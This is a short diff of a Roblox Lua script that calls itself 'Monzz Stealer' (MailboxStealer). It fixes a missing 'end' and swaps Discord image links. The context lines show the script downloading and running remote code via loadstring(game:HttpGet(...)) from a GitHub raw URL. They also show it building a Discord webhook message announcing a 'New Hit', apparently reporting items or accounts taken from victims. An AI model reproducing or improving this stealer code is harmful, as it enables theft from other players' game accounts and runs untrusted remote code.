@@ -103,6 +103,7 @@ end
 
 if _G.LoadingScreen ~= false then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua"))()
+end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
         if v.Name ~= "Inventory" then
@@ -1221,12 +1222,12 @@ end
 -- Img
 local data1
 if banktiercheck == true then
-    imgs = "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg"
+    imgs = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
 
     data1 = {
         ["content"] = ping,
         ["username"] = "Monzz Scriptz",
-        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1121512295709806782/1130597250876330005/vidma_20230718_032704.gif",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1134876352273719427/IMG_20230728_042256_946.jpg",
         ["embeds"] = { {
             ["title"] = "**New Hit** ||Monzz Stealer||",
             ["url"] = "https://discord.gg/4y4CZfdJHu",
